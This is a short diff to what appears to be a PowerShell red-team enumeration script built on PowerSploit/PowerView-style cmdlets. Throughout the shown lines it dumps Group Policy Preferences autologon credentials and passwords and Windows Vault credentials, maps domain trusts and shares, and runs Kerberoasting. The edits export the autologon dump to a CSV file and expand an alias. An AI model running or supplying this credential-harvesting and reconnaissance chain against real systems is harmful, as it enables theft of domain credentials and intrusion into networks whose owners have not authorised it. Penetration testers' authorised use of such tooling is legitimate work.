@@ -58,7 +58,7 @@ Import-module .\Exfiltration\Exfiltration
 ## Exfiltration Checks
 "[*] Exfiltration Checks" | Tee-Object -FilePath $out_file -Append
 "[*] Dump GPP Autologon Creds" | Tee-Object -FilePath $out_file -Append
-Get-GPPAutologon | Tee-Object -FilePath $out_file -Append
+Get-GPPAutologon | Tee-Object -FilePath $out_file -Append | Export-PowerViewCSV -Path "users.csv"
 "[*] Dump GPP Password" | Tee-Object -FilePath $out_file -Append
 Get-GPPPassword | Tee-Object -FilePath $out_file -Append
 "[*] Dump Windows Vault Creds" | Tee-Object -FilePath $out_file -Append
@@ -74,7 +74,7 @@ Invoke-MapDomainTrust | Tee-Object -FilePath $out_file -Append
 "[*] Dump Domain Shares" | Tee-Object -FilePath $out_file -Append
 Invoke-ShareFinder | Tee-Object -FilePath $out_file -Append
 "[*] Dump SPN and Kerberos Tickets details" | Tee-Object -FilePath $out_file -Append
-Invoke-Kerberoast | fl | Tee-Object -FilePath $out_file -Append
+Invoke-Kerberoast | Format-List | Tee-Object -FilePath $out_file -Append
 
 ## Privesc Checks
 "[*] Privesc Checks" | Tee-Object -FilePath $out_file -Append
